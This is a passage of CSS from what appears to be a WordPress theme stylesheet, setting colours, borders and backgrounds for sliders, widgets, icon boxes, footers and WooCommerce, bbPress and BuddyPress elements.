#FFFFFF; border-bottom: #a8ad00}#swift-slider .flex-caption-large, #swift-slider .flex-caption-large h1 a {color: #ffffff;}#swift-slider .flex-caption h4 i {line-height: 20px;}#swift-slider .flex-caption-large .comment-chart i {color: #ffffff;}#swift-slider .flex-caption-large .loveit-chart span {color: #a8ad00;}#swift-slider .flex-caption-large a {color: #a8ad00;}#swift-slider .flex-caption .comment-chart i, #swift-slider .flex-caption .comment-chart span {color: #2b2b2b;}figure.animated-overlay figcaption {background-color: #a8ad00;}
figure.animated-overlay figcaption .thumb-info h4, figure.animated-overlay figcaption .thumb-info h5, figcaption .thumb-info-excerpt p {color: #ffffff;}figure.animated-overlay figcaption .thumb-info i {background: #2b2b2b; color: #ffffff;}figure:hover .overlay {box-shadow: inset 0 0 0 500px #a8ad00;}h4.spb-heading span:before, h4.spb-heading span:after, h3.spb-heading span:before, h3.spb-heading span:after, h4.lined-heading span:before, h4.lined-heading span:after {border-color: #a8ad00}h4.spb-heading:before, h3.spb-heading:before, h4.lined-heading:before {border-top-color: #a8ad00}.spb_parallax_asset h4.spb-heading {border-bottom-color: #003057}.testimonials.carousel-items li .testimonial-text {background-color: #f7f7f7;}.sidebar .widget-heading h4 {color: #003057;}.widget ul li, .widget.widget_lip_most_loved_widget li {border-color: #a8ad00;}.widget.widget_lip_most_loved_widget li {background: #FFFFFF; border-color: #a8ad00;}.widget_lip_most_loved_widget .loved-item > span {color: #222222;}.widget_search form input {background: #FFFFFF;}.widget .wp-tag-cloud li a {background: #f7f7f7; border-color: #a8ad00;}.widget .tagcloud a:hover, .widget ul.wp-tag-cloud li:hover > a {background-color: #a8ad00; color: #ffffff;}.loved-item .loved-count > i {color: #003057;background: #a8ad00;}.subscribers-list li > a.social-circle {color: #ffffff;background: #2b2b2b;}.subscribers-list li:hover > a.social-circle {color: #fbfbfb;background: #a8ad00;}.sidebar .widget_categories ul > li a, .sidebar .widget_archive ul > li a, .sidebar .widget_nav_menu ul > li a, .sidebar .widget_meta ul > li a, .sidebar .widget_recent_entries ul > li, .widget_product_categories ul > li a, .widget_layered_nav ul > li a {color: #767676;}.sidebar .widget_categories ul > li a:hover, .sidebar .widget_archive ul > li a:hover, .sidebar .widget_nav_menu ul > li a:hover, .widget_nav_menu ul > li.current-menu-item a, .sidebar .widget_meta ul > li a:hover, .sidebar .widget_recent_entries ul > li a:hover, .widget_product_categories ul > li a:hover, .widget_layered_nav ul > li a:hover {color: #a8ad00;}#calendar_wrap caption {border-bottom-color: #2b2b2b;}.sidebar .widget_calendar tbody tr > td a {color: #ffffff;background-color: #2b2b2b;}.sidebar .widget_calendar tbody tr > td a:hover {background-color: #a8ad00;}.sidebar .widget_calendar tfoot a {color: #2b2b2b;}.sidebar .widget_calendar tfoot a:hover {color: #a8ad00;}.widget_calendar #calendar_wrap, .widget_calendar th, .widget_calendar tbody tr > td, .widget_calendar tbody tr > td.pad {border-color: #a8ad00;}.widget_sf_infocus_widget .infocus-item h5 a {color: #2b2b2b;}.widget_sf_infocus_widget .infocus-item h5 a:hover {color: #a8ad00;}.sidebar .widget hr {border-color: #a8ad00;}.widget ul.flickr_images li a:after, .portfolio-grid li a:after {color: #ffffff;}.slideout-filter .select:after {background: #FFFFFF;}.slideout-filter ul li a {color: #ffffff;}.slideout-filter ul li a:hover {color: #a8ad00;}.slideout-filter ul li.selected a {color: #ffffff;background: #a8ad00;}ul.portfolio-filter-tabs li.selected a {background: #f7f7f7;}.spb_blog_widget .filter-wrap {background-color: #222;}.portfolio-item {border-bottom-color: #a8ad00;}.masonry-items .portfolio-item-details {background: #f7f7f7;}.spb_portfolio_carousel_widget .portfolio-item {background: #FFFFFF;}.spb_portfolio_carousel_widget .portfolio-item h4.portfolio-item-title a > i {line-height: 20px;}.masonry-items .blog-item .blog-details-wrap:before {background-color: #f7f7f7;}.masonry-items .portfolio-item figure {border-color: #a8ad00;}.portfolio-details-wrap span span {color: #666;}.share-links > a:hover {color: #a8ad00;}.blog-aux-options li.selected a {background: #a8ad00;border-color: #a8ad00;color: #ffffff;}.blog-filter-wrap .aux-list li:hover {border-bottom-color: transparent;}.blog-filter-wrap .aux-list li:hover a {color: #ffffff;background: #a8ad00;}.mini-blog-item-wrap, .mini-items .mini-alt-wrap, .mini-items .mini-alt-wrap .quote-excerpt, .mini-items .mini-alt-wrap .link-excerpt, .masonry-items .blog-item .quote-excerpt, .masonry-items .blog-item .link-excerpt, .standard-post-content .quote-excerpt, .standard-post-content .link-excerpt, .timeline, .post-info, .body-text .link-pages, .page-content .link-pages {border-color: #a8ad00;}.post-info, .article-body-wrap .share-links .share-text, .article-body-wrap .share-links a {color: #222222;}.standard-post-date {background: #a8ad00;}.standard-post-content {background: #f7f7f7;}.format-quote .standard-post-content:before, .standard-post-content.no-thumb:before {border-left-color: #f7f7f7;}.search-item-img .img-holder {background: #f7f7f7;border-color:#a8ad00;}.masonry-items .blog-item .masonry-item-wrap {background: #f7f7f7;}.mini-items .blog-item-details, .share-links, .single-portfolio .share-links, .single .pagination-wrap, ul.portfolio-filter-tabs li a {border-color: #a8ad00;}.related-item figure {background-color: #2b2b2b; color: #ffffff}.required {color: #ee3c59;}.comments-likes a i, .comments-likes a span, .comments-likes .love-it-wrapper a i, .comments-likes span.love-count, .share-links ul.bar-styling > li > a {color: #222222;}#respond .form-submit input:hover {color: #fff!important;}.recent-post {background: #FFFFFF;}.recent-post .post-item-details {border-top-color: #a8ad00;color: #a8ad00;}.post-item-details span, .post-item-details a, .post-item-details .comments-likes a i, .post-item-details .comments-likes a span {color: #222222;}.sf-button.accent {color: #ffffff; background-color: #a8ad00;}.sf-button.sf-icon-reveal.accent {color: #ffffff!important; background-color: #a8ad00!important;}.sf-button.accent:hover {background-color: #2b2b2b;color: #ffffff;}a.sf-button, a.sf-button:hover, #footer a.sf-button:hover {background-image: none;color: #fff!important;}a.sf-button.gold, a.sf-button.gold:hover, a.sf-button.lightgrey, a.sf-button.lightgrey:hover, a.sf-button.white, a.sf-button.white:hover {color: #222!important;}a.sf-button.transparent-dark {color: #003057!important;}a.sf-button.transparent-light:hover, a.sf-button.transparent-dark:hover {color: #a8ad00!important;} input[type='submit'], .wpcf7 input.wpcf7-submit[type='submit'], .gform_wrapper input[type='submit'], .mymail-form input[type='submit'] {color: #fff;}input[type='submit']:hover, .wpcf7 input.wpcf7-submit[type='submit']:hover, .gform_wrapper input[type='submit']:hover, .mymail-form input[type='submit']:hover {background-color: #2b2b2b!important;color: #ffffff;}input[type='text'], input[type='email'], input[type='password'], textarea, select, .wpcf7 input[type='text'], .wpcf7 input[type='email'], .wpcf7 textarea, .wpcf7 select, .ginput_container input[type='text'], .ginput_container input[type='email'], .ginput_container textarea, .ginput_container select, .mymail-form input[type='text'], .mymail-form input[type='email'], .mymail-form textarea, .mymail-form select {background: #f7f7f7; border-color: #a8ad00;}.sf-icon {color: #a8ad00;}.sf-icon-cont {border-color: rgba(118,136,29,0.5);}.sf-icon-cont:hover, .sf-hover .sf-icon-cont, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont, .sf-hover .sf-icon-box-hr {background-color: #76881d;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont:after {border-top-color: #76881d;border-left-color: #76881d;}.sf-icon-cont:hover .sf-icon, .sf-hover .sf-icon-cont .sf-icon, .sf-icon-box.sf-icon-box-boxed-one .sf-icon, .sf-icon-box.sf-icon-box-boxed-three .sf-icon {color: #ffffff;}.sf-icon-box-animated .front {background: #f7f7f7; border-color: #a8ad00;}.sf-icon-box-animated .front h3 {color: #003057!important;}.sf-icon-box-animated .back {background: #a8ad00; border-color: #a8ad00;}.sf-icon-box-animated .back, .sf-icon-box-animated .back h3 {color: #ffffff!important;}.sf-icon-accent.sf-icon-cont, .sf-icon-accent > i {color: #a8ad00;}.sf-icon-cont.sf-icon-accent {border-color: #a8ad00;}.sf-icon-cont.sf-icon-accent:hover, .sf-hover .sf-icon-cont.sf-icon-accent, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont.sf-icon-accent, .sf-hover .sf-icon-box-hr.sf-icon-accent {background-color: #a8ad00;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont.sf-icon-accent:after {border-top-color: #a8ad00;border-left-color: #a8ad00;}.sf-icon-cont.sf-icon-accent:hover .sf-icon, .sf-hover .sf-icon-cont.sf-icon-accent .sf-icon, .sf-icon-box.sf-icon-box-boxed-one.sf-icon-accent .sf-icon, .sf-icon-box.sf-icon-box-boxed-three.sf-icon-accent .sf-icon {color: #ffffff;}.sf-icon-secondary-accent.sf-icon-cont, .sf-icon-secondary-accent > i {color: #2b2b2b;}.sf-icon-cont.sf-icon-secondary-accent {border-color: #2b2b2b;}.sf-icon-cont.sf-icon-secondary-accent:hover, .sf-hover .sf-icon-cont.sf-icon-secondary-accent, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont.sf-icon-secondary-accent, .sf-hover .sf-icon-box-hr.sf-icon-secondary-accent {background-color: #2b2b2b;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont.sf-icon-secondary-accent:after {border-top-color: #2b2b2b;border-left-color: #2b2b2b;}.sf-icon-cont.sf-icon-secondary-accent:hover .sf-icon, .sf-hover .sf-icon-cont.sf-icon-secondary-accent .sf-icon, .sf-icon-box.sf-icon-box-boxed-one.sf-icon-secondary-accent .sf-icon, .sf-icon-box.sf-icon-box-boxed-three.sf-icon-secondary-accent .sf-icon {color: #ffffff;}.sf-icon-box-animated .back.sf-icon-secondary-accent {background: #2b2b2b; border-color: #2b2b2b;}.sf-icon-box-animated .back.sf-icon-secondary-accent, .sf-icon-box-animated .back.sf-icon-secondary-accent h3 {color: #ffffff!important;}.sf-icon-icon-one.sf-icon-cont, .sf-icon-icon-one > i, i.sf-icon-icon-one {color: #76881d;}.sf-icon-cont.sf-icon-icon-one {border-color: #76881d;}.sf-icon-cont.sf-icon-icon-one:hover, .sf-hover .sf-icon-cont.sf-icon-icon-one, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-one, .sf-hover .sf-icon-box-hr.sf-icon-icon-one {background-color: #76881d;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-one:after {border-top-color: #76881d;border-left-color: #76881d;}.sf-icon-cont.sf-icon-icon-one:hover .sf-icon, .sf-hover .sf-icon-cont.sf-icon-icon-one .sf-icon, .sf-icon-box.sf-icon-box-boxed-one.sf-icon-icon-one .sf-icon, .sf-icon-box.sf-icon-box-boxed-three.sf-icon-icon-one .sf-icon {color: #ffffff;}.sf-icon-box-animated .back.sf-icon-icon-one {background: #76881d; border-color: #76881d;}.sf-icon-box-animated .back.sf-icon-icon-one, .sf-icon-box-animated .back.sf-icon-icon-one h3 {color: #ffffff!important;}.sf-icon-icon-two.sf-icon-cont, .sf-icon-icon-two > i, i.sf-icon-icon-two {color: #76881d;}.sf-icon-cont.sf-icon-icon-two {border-color: #76881d;}.sf-icon-cont.sf-icon-icon-two:hover, .sf-hover .sf-icon-cont.sf-icon-icon-two, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-two, .sf-hover .sf-icon-box-hr.sf-icon-icon-two {background-color: #76881d;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-two:after {border-top-color: #76881d;border-left-color: #76881d;}.sf-icon-cont.sf-icon-icon-two:hover .sf-icon, .sf-hover .sf-icon-cont.sf-icon-icon-two .sf-icon, .sf-icon-box.sf-icon-box-boxed-one.sf-icon-icon-two .sf-icon, .sf-icon-box.sf-icon-box-boxed-three.sf-icon-icon-two .sf-icon {color: #ffffff;}.sf-icon-box-animated .back.sf-icon-icon-two {background: #76881d; border-color: #76881d;}.sf-icon-box-animated .back.sf-icon-icon-two, .sf-icon-box-animated .back.sf-icon-icon-two h3 {color: #ffffff!important;}.sf-icon-icon-three.sf-icon-cont, .sf-icon-icon-three > i, i.sf-icon-icon-three {color: #003057;}.sf-icon-cont.sf-icon-icon-three {border-color: #003057;}.sf-icon-cont.sf-icon-icon-three:hover, .sf-hover .sf-icon-cont.sf-icon-icon-three, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-three, .sf-hover .sf-icon-box-hr.sf-icon-icon-three {background-color: #003057;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-three:after {border-top-color: #003057;border-left-color: #003057;}.sf-icon-cont.sf-icon-icon-three:hover .sf-icon, .sf-hover .sf-icon-cont.sf-icon-icon-three .sf-icon, .sf-icon-box.sf-icon-box-boxed-one.sf-icon-icon-three .sf-icon, .sf-icon-box.sf-icon-box-boxed-three.sf-icon-icon-three .sf-icon {color: #ffffff;}.sf-icon-box-animated .back.sf-icon-icon-three {background: #003057; border-color: #003057;}.sf-icon-box-animated .back.sf-icon-icon-three, .sf-icon-box-animated .back.sf-icon-icon-three h3 {color: #ffffff!important;}.sf-icon-icon-four.sf-icon-cont, .sf-icon-icon-four > i, i.sf-icon-icon-four {color: #2b2b2b;}.sf-icon-cont.sf-icon-icon-four {border-color: #2b2b2b;}.sf-icon-cont.sf-icon-icon-four:hover, .sf-hover .sf-icon-cont.sf-icon-icon-four, .sf-icon-box[class*='icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-four, .sf-hover .sf-icon-box-hr.sf-icon-icon-four {background-color: #2b2b2b;}.sf-icon-box[class*='sf-icon-box-boxed-'] .sf-icon-cont.sf-icon-icon-four:after {border-top-color: #2b2b2b;border-left-color: #2b2b2b;}.sf-icon-cont.sf-icon-icon-four:hover .sf-icon, .sf-hover .sf-icon-cont.sf-icon-icon-four .sf-icon, .sf-icon-box.sf-icon-box-boxed-one.sf-icon-icon-four .sf-icon, .sf-icon-box.sf-icon-box-boxed-three.sf-icon-icon-four .sf-icon {color: #ffffff;}.sf-icon-box-animated .back.sf-icon-icon-four {background: #2b2b2b; border-color: #2b2b2b;}.sf-icon-box-animated .back.sf-icon-icon-four, .sf-icon-box-animated .back.sf-icon-icon-four h3 {color: #ffffff!important;}span.dropcap3 {background: #000;color: #fff;}span.dropcap4 {color: #fff;}.spb_divider, .spb_divider.go_to_top_icon1, .spb_divider.go_to_top_icon2, .testimonials > li, .jobs > li, .spb_impact_text, .tm-toggle-button-wrap, .tm-toggle-button-wrap a, .portfolio-details-wrap, .spb_divider.go_to_top a, .impact-text-wrap, .widget_search form input, .asset-bg.spb_divider {border-color: #a8ad00;}.spb_divider.go_to_top_icon1 a, .spb_divider.go_to_top_icon2 a {background: #FFFFFF;}.spb_tabs .ui-tabs .ui-tabs-panel, .spb_content_element .ui-tabs .ui-tabs-nav, .ui-tabs .ui-tabs-nav li {border-color: #a8ad00;}.spb_tabs .ui-tabs .ui-tabs-panel, .ui-tabs .ui-tabs-nav li.ui-tabs-active a {background: #FFFFFF!important;}.spb_tabs .nav-tabs li a, .nav-tabs>li.active>a, .nav-tabs>li.active>a:hover, .nav-tabs>li.active>a:focus, .spb_accordion .spb_accordion_section, .spb_tour .nav-tabs li a {border-color: #a8ad00;}.spb_tabs .nav-tabs li.active a, .spb_tour .nav-tabs li.active a, .spb_accordion .spb_accordion_section > h3.ui-state-active a {background-color: #f7f7f7;}.spb_tour .ui-tabs .ui-tabs-nav li a {border-color: #a8ad00;}.spb_tour.span3 .ui-tabs .ui-tabs-nav li {border-color: #a8ad00!important;}.toggle-wrap .spb_toggle, .spb_toggle_content {border-color: #a8ad00;}.toggle-wrap .spb_toggle:hover {color: #a8ad00;}.ui-accordion h3.ui-accordion-header .ui-icon {color: #003057;}.ui-accordion h3.ui-accordion-header.ui-state-active:hover a, .ui-accordion h3.ui-accordion-header:hover .ui-icon {color: #a8ad00;}blockquote.pullquote {border-color: #a8ad00;}.borderframe img {border-color: #eeeeee;}.labelled-pricing-table .column-highlight {background-color: #fff;}.labelled-pricing-table .pricing-table-label-row, .labelled-pricing-table .pricing-table-row {background: #f7f7f7;}.labelled-pricing-table .alt-row {background: #fff;}.labelled-pricing-table .pricing-table-price {background: #e4e4e4;}.labelled-pricing-table .pricing-table-package {background: #f7f7f7;}.labelled-pricing-table .lpt-button-wrap {background: #e4e4e4;}.labelled-pricing-table .lpt-button-wrap a.accent {background: #222!important;}.labelled-pricing-table .column-highlight .lpt-button-wrap {background: transparent!important;}.labelled-pricing-table .column-highlight .lpt-button-wrap a.accent {background: #a8ad00!important;}.column-highlight .pricing-table-price {color: #fff;background: #76881d;border-bottom-color: #76881d;}.column-highlight .pricing-table-package {background: #a8ad00;}.column-highlight .pricing-table-details {background: #d3d680;}.spb_box_text.coloured .box-content-wrap {background: #003057;color: #fff;}.spb_box_text.whitestroke .box-content-wrap {background-color: #fff;border-color: #a8ad00;}.client-item figure {border-color: #a8ad00;}.client-item figure:hover {border-color: #333;}ul.member-contact li a:hover {color: #333;}.testimonials.carousel-items li .testimonial-text {border-color: #a8ad00;}.testimonials.carousel-items li .testimonial-text:after {border-left-color: #a8ad00;border-top-color: #a8ad00;}.team-member figure figcaption {background: #f7f7f7;}.horizontal-break {background-color: #a8ad00;}.progress .bar {background-color: #a8ad00;}.progress.standard .bar {background: #a8ad00;}.progress-bar-wrap .progress-value {color: #a8ad00;}.asset-bg-detail {background:#FFFFFF;border-color:#a8ad00;}#footer {background: #003057;}#footer, #footer p {color: #ffffff;}#footer h6 {color: #ffffff;}#footer a {color: #ffffff;}#footer .widget ul li, #footer .widget_categories ul, #footer .widget_archive ul, #footer .widget_nav_menu ul, #footer .widget_recent_comments ul, #footer .widget_meta ul, #footer .widget_recent_entries ul, #footer .widget_product_categories ul {border-color: #ffffff;}#copyright {background-color: #003057;border-top-color: #ffffff;}#copyright p {color: #979797;}#copyright a {color: #ffffff;}#copyright a:hover {color: #a8ad00;}#copyright nav .menu li {border-left-color: #ffffff;}#footer .widget_calendar #calendar_wrap, #footer .widget_calendar th, #footer .widget_calendar tbody tr > td, #footer .widget_calendar tbody tr > td.pad {border-color: #ffffff;}.widget input[type='email'] {background: #f7f7f7; color: #999}#footer .widget hr {border-color: #ffffff;}.woocommerce nav.woocommerce-pagination ul li a, .woocommerce nav.woocommerce-pagination ul li span, .modal-body .comment-form-rating, .woocommerce form .form-row input.input-text, ul.checkout-process, #billing .proceed, ul.my-account-nav > li, .woocommerce #payment, .woocommerce-checkout p.thank-you, .woocommerce .order_details, .woocommerce-page .order_details, .woocommerce ul.products li.product figure figcaption .yith-wcwl-add-to-wishlist, #product-accordion .panel, .review-order-wrap { border-color: #a8ad00 ;}nav.woocommerce-pagination ul li span.current, nav.woocommerce-pagination ul li a:hover {background:#a8ad00!important;border-color:#a8ad00;color: #ffffff!important;}.woocommerce-account p.myaccount_address, .woocommerce-account .page-content h2, p.no-items, #order_review table.shop_table, #payment_heading, .returning-customer a {border-bottom-color: #a8ad00;}.woocommerce .products ul, .woocommerce ul.products, .woocommerce-page .products ul, .woocommerce-page ul.products, p.no-items {border-top-color: #a8ad00;}.woocommerce-ordering .woo-select, .variations_form .woo-select, .add_review a, .woocommerce .quantity, .woocommerce-page .quantity, .woocommerce .coupon input.apply-coupon, .woocommerce table.shop_table tr td.product-remove .remove, .woocommerce .button.update-cart-button, .shipping-calculator-form .woo-select, .woocommerce .shipping-calculator-form .update-totals-button button, .woocommerce #billing_country_field .woo-select, .woocommerce #shipping_country_field .woo-select, .woocommerce #review_form #respond .form-submit input, .woocommerce form .form-row input.input-text, .woocommerce table.my_account_orders .order-actions .button, .woocommerce #payment div.payment_box, .woocommerce .widget_price_filter .price_slider_amount .button, .woocommerce.widget .buttons a, .load-more-btn {background: #f7f7f7; color: #2b2b2b}.woocommerce-page nav.woocommerce-pagination ul li span.current, .woocommerce nav.woocommerce-pagination ul li span.current { color: #ffffff;}li.product figcaption a.product-added {color: #ffffff;}.woocommerce ul.products li.product figure figcaption, .yith-wcwl-add-button a, ul.products li.product a.quick-view-button, .yith-wcwl-add-to-wishlist, .woocommerce form.cart button.single_add_to_cart_button, .woocommerce p.cart a.single_add_to_cart_button, .lost_reset_password p.form-row input[type='submit'], .track_order p.form-row input[type='submit'], .change_password_form p input[type='submit'], .woocommerce form.register input[type='submit'], .woocommerce .wishlist_table tr td.product-add-to-cart a, .woocommerce input.button[name='save_address'], .woocommerce .woocommerce-message a.button {background: #f7f7f7;}.woocommerce ul.products li.product figure figcaption .shop-actions > a, .woocommerce .wishlist_table tr td.product-add-to-cart a {color: #003057;}.woocommerce ul.products li.product figure figcaption .shop-actions > a.product-added, .woocommerce ul.products li.product figure figcaption .shop-actions > a.product-added:hover {color: #ffffff;}ul.products li.product .product-details .posted_in a {color: #222222;}.woocommerce ul.products li.product figure figcaption .shop-actions > a:hover, ul.products li.product .product-details .posted_in a:hover {color: #a8ad00;}.woocommerce form.cart button.single_add_to_cart_button, .woocommerce p.cart a.single_add_to_cart_button, .woocommerce input[name='save_account_details'] { background: #f7f7f7!important; color: #003057 ;}
.woocommerce form.cart button.single_add_to_cart_button:disabled, .woocommerce form.cart button.single_add_to_cart_button:disabled[disabled] { background: #f7f7f7!important; color: #003057 ;}
.woocommerce form.cart button.single_add_to_cart_button:hover, .woocommerce .button.checkout-button, .woocommerce .wc-proceed-to-checkout > a.checkout-button { background: #a8ad00!important; color: #ffffff ;}
.woocommerce p.cart a.single_add_to_cart_button:hover, .woocommerce .button.checkout-button:hover, .woocommerce .wc-proceed-to-checkout > a.checkout-button:hover {background: #2b2b2b!important; color: #a8ad00!important;}.woocommerce table.shop_table tr td.product-remove .remove:hover, .woocommerce .coupon input.apply-coupon:hover, .woocommerce .shipping-calculator-form .update-totals-button button:hover, .woocommerce .quantity .plus:hover, .woocommerce .quantity .minus:hover, .add_review a:hover, .woocommerce #review_form #respond .form-submit input:hover, .lost_reset_password p.form-row input[type='submit']:hover, .track_order p.form-row input[type='submit']:hover, .change_password_form p input[type='submit']:hover, .woocommerce table.my_account_orders .order-actions .button:hover, .woocommerce .widget_price_filter .price_slider_amount .button:hover, .woocommerce.widget .buttons a:hover, .woocommerce .wishlist_table tr td.product-add-to-cart a:hover, .woocommerce input.button[name='save_address']:hover, .woocommerce input[name='apply_coupon']:hover, .woocommerce button[name='apply_coupon']:hover, .woocommerce .cart input[name='update_cart']:hover, .woocommerce form.register input[type='submit']:hover, .woocommerce form.cart button.single_add_to_cart_button:hover, .woocommerce form.cart .yith-wcwl-add-to-wishlist a:hover, .load-more-btn:hover, .woocommerce-account input[name='change_password']:hover {background: #a8ad00; color: #ffffff;}.woocommerce-MyAccount-navigation li {border-color: #a8ad00;}.woocommerce-MyAccount-navigation li.is-active a, .woocommerce-MyAccount-navigation li a:hover {color: #003057;}.woocommerce #account_details .login, .woocommerce #account_details .login h4.lined-heading span, .my-account-login-wrap .login-wrap, .my-account-login-wrap .login-wrap h4.lined-heading span, .woocommerce div.product form.cart table div.quantity {background: #f7f7f7;}.woocommerce .help-bar ul li a:hover, .woocommerce .continue-shopping:hover, .woocommerce .address .edit-address:hover, .my_account_orders td.order-number a:hover, .product_meta a.inline:hover { border-bottom-color: #a8ad00;}.woocommerce .order-info, .woocommerce .order-info mark {background: #a8ad00; color: #ffffff;}.woocommerce #payment div.payment_box:after {border-bottom-color: #f7f7f7;}.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content {background: #a8ad00;}.woocommerce .widget_price_filter .ui-slider-horizontal .ui-slider-range {background: #f7f7f7;}.yith-wcwl-wishlistexistsbrowse a:hover, .yith-wcwl-wishlistaddedbrowse a:hover {color: #ffffff;}.woocommerce ul.products li.product .price, .woocommerce div.product p.price {color: #003057;}.woocommerce ul.products li.product-category .product-cat-info {background: #a8ad00;}.woocommerce ul.products li.product-category .product-cat-info:before {border-bottom-color:#a8ad00;}.woocommerce ul.products li.product-category a:hover .product-cat-info {background: #a8ad00; color: #ffffff;}.woocommerce ul.products li.product-category a:hover .product-cat-info h3 {color: #ffffff!important;}.woocommerce ul.products li.product-category a:hover .product-cat-info:before {border-bottom-color:#a8ad00;}.woocommerce input[name='apply_coupon'], .woocommerce button[name='apply_coupon'], .woocommerce .cart input[name='update_cart'], .woocommerce .shipping-calc-wrap button[name='calc_shipping'], .woocommerce-account input[name='change_password'] {background: #f7f7f7!important; color: #2b2b2b!important}.woocommerce input[name='apply_coupon']:hover, .woocommerce button[name='apply_coupon']:hover, .woocommerce .cart input[name='update_cart']:hover, .woocommerce .shipping-calc-wrap button[name='calc_shipping']:hover, .woocommerce-account input[name='change_password']:hover, .woocommerce input[name='save_account_details']:hover {background: #a8ad00!important; color: #ffffff!important;}#buddypress .activity-meta a, #buddypress .acomment-options a, #buddypress #member-group-links li a {border-color: #a8ad00;}#buddypress .activity-meta a:hover, #buddypress .acomment-options a:hover, #buddypress #member-group-links li a:hover {border-color: #a8ad00;}#buddypress .activity-header a, #buddypress .activity-read-more a {border-color: #a8ad00;}#buddypress #members-list .item-meta .activity, #buddypress .activity-header p {color: #222222;}#buddypress .pagination-links span, #buddypress .load-more.loading a {background-color: #a8ad00;color: #ffffff;border-color: #a8ad00;}span.bbp-admin-links a, li.bbp-forum-info .bbp-forum-content {color: #222222;}span.bbp-admin-links a:hover {color: #a8ad00;}.bbp-topic-action #favorite-toggle a, .bbp-topic-action #subscription-toggle a, .bbp-single-topic-meta a, .bbp-topic-tags a, #bbpress-forums li.bbp-body ul.forum, #bbpress-forums li.bbp-body ul.topic, #bbpress-forums li.bbp-header, #bbpress-forums li.bbp-footer, #bbp-user-navigation ul li a, .bbp-pagination-links a, #bbp-your-profile fieldset input, #bbp-your-profile fieldset textarea, #bbp-your-profile, #bbp-your-profile fieldset {border-color: #a8ad00;}.bbp-topic-action #favorite-toggle a:hover, .bbp-topic-action #subscription-toggle a:hover, .bbp-single-topic-meta a:hover, .bbp-topic-tags a:hover, #bbp-user-navigation ul li a:hover, .bbp-pagination-links a:hover {border-color: #a8ad00;}#bbp-user-navigation ul li.current a, .bbp-pagination-links span.current {border-color: #a8ad00;background: #a8ad00; color: #ffffff;}#bbpress-forums fieldset.bbp-form button[type='submit'], #bbp_user_edit_submit {background: #f7f7f7; color: #2b2b2b}#bbpress-forums fieldset.bbp-form button[type='submit']:hover, #bbp_user_edit_submit:hover {background: #a8ad00; color: #ffffff;}.asset-bg {border-color: #a8ad00;}.asset-bg.alt-one {background-color: #FFFFFF;}.asset-bg.alt-one, .asset-bg .alt-one, .asset-bg.alt-one h1, .asset-bg.alt-one h2, .asset-bg.alt-one h3, .asset-bg.alt-one h3, .asset-bg.alt-one h4, .asset-bg.alt-one h5, .asset-bg.alt-one h6, .alt-one .carousel-wrap > a {color: #222222;}.asset-bg.alt-one h4.spb-center-heading span:before, .asset-bg.alt-one h4.spb-center-heading span:after {border-color: #222222;}.alt-one .full-width-text:after {border-top-color:#FFFFFF;}.alt-one h4.spb-text-heading, .alt-one h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-two {background-color: #FFFFFF;}.asset-bg.alt-two, .asset-bg .alt-two, .asset-bg.alt-two h1, .asset-bg.alt-two h2, .asset-bg.alt-two h3, .asset-bg.alt-two h3, .asset-bg.alt-two h4, .asset-bg.alt-two h5, .asset-bg.alt-two h6, .alt-two .carousel-wrap > a {color: #222222;}.asset-bg.alt-two h4.spb-center-heading span:before, .asset-bg.alt-two h4.spb-center-heading span:after {border-color: #222222;}.alt-two .full-width-text:after {border-top-color:#FFFFFF;}.alt-two h4.spb-text-heading, .alt-two h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-three {background-color: #FFFFFF;}.asset-bg.alt-three, .asset-bg .alt-three, .asset-bg.alt-three h1, .asset-bg.alt-three h2, .asset-bg.alt-three h3, .asset-bg.alt-three h3, .asset-bg.alt-three h4, .asset-bg.alt-three h5, .asset-bg.alt-three h6, .alt-three .carousel-wrap > a {color: #222222;}.asset-bg.alt-three h4.spb-center-heading span:before, .asset-bg.alt-three h4.spb-center-heading span:after {border-color: #222222;}.alt-three .full-width-text:after {border-top-color:#FFFFFF;}.alt-three h4.spb-text-heading, .alt-three h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-four {background-color: #FFFFFF;}.asset-bg.alt-four, .asset-bg .alt-four, .asset-bg.alt-four h1, .asset-bg.alt-four h2, .asset-bg.alt-four h3, .asset-bg.alt-four h3, .asset-bg.alt-four h4, .asset-bg.alt-four h5, .asset-bg.alt-four h6, .alt-four .carousel-wrap > a {color: #222222;}.asset-bg.alt-four h4.spb-center-heading span:before, .asset-bg.alt-four h4.spb-center-heading span:after {border-color: #222222;}.alt-four .full-width-text:after {border-top-color:#FFFFFF;}.alt-four h4.spb-text-heading, .alt-four h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-five {background-color: #FFFFFF;}.asset-bg.alt-five, .asset-bg .alt-five, .asset-bg.alt-five h1, .asset-bg.alt-five h2, .asset-bg.alt-five h3, .asset-bg.alt-five h3, .asset-bg.alt-five h4, .asset-bg.alt-five h5, .asset-bg.alt-five h6, .alt-five .carousel-wrap > a {color: #222222;}.asset-bg.alt-five h4.spb-center-heading span:before, .asset-bg.alt-five h4.spb-center-heading span:after {border-color: #222222;}.alt-five .full-width-text:after {border-top-color:#FFFFFF;}.alt-five h4.spb-text-heading, .alt-five h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-six {background-color: #FFFFFF;}.asset-bg.alt-six, .asset-bg .alt-six, .asset-bg.alt-six h1, .asset-bg.alt-six h2, .asset-bg.alt-six h3, .asset-bg.alt-six h3, .asset-bg.alt-six h4, .asset-bg.alt-six h5, .asset-bg.alt-six h6, .alt-six .carousel-wrap > a {color: #222222;}.asset-bg.alt-six h4.spb-center-heading span:before, .asset-bg.alt-six h4.spb-center-heading 